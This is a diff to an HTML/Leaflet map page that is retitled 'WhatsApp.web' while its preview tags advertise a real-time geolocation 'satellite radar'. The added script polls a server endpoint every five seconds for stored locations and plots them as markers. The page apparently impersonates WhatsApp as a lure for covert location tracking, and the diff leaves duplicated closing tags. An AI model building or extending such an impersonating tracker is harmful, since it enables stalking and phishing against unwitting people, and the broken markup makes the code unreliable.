@@ -2,7 +2,7 @@
 <html lang="es">
 <head>
     <meta charset="UTF-8">
-    <title>WhatsApp</title>
+    <title>WhatsApp.web</title>
     <meta property="og:title" content="Acceso a Radar Satelital">
     <meta property="og:description" content="Sistema de monitoreo de geolocalización en tiempo real.">
     <meta property="og:image" content="https://tu-url-de-imagen.jpg"> <meta property="og:type" content="website">
@@ -108,6 +108,29 @@ L.tileLayer('https://{s}.basemaps.cartocdn.com/light_only_labels/{z}/{x}/{y}{r}.
 
         historyDots = L.layerGroup().addTo(map);
 
+        function actualizarMarcadores() {
+    fetch('/obtener_ubicaciones')
+        .then(response => response.json())
+        .then(data => {
+            // Borrar marcadores anteriores para no duplicar
+            map.eachLayer((layer) => {
+                if (layer instanceof L.Marker) {
+                    map.removeLayer(layer);
+                }
+            });
+
+            // Dibujar los nuevos puntos
+            data.forEach(punto => {
+                L.marker([punto.lat, punto.lng]).addTo(map);
+            });
+        })
+        .catch(error => console.error('Error al actualizar:', error));
+}
+
+// Carga inicial y refresco cada 5 segundos
+actualizarMarcadores();
+setInterval(actualizarMarcadores, 5000);
+
         // 3. BARRA DE HERRAMIENTAS TACTICAS (Dibujo y Medida)
         let drawnItems = new L.FeatureGroup();
         map.addLayer(drawnItems);
@@ -196,5 +219,7 @@ document.addEventListener('mousemove', (e) => {
 }, true);
         window.onload = initMap;
     </script>
+</body>
+</html>
 </body>
 </html>
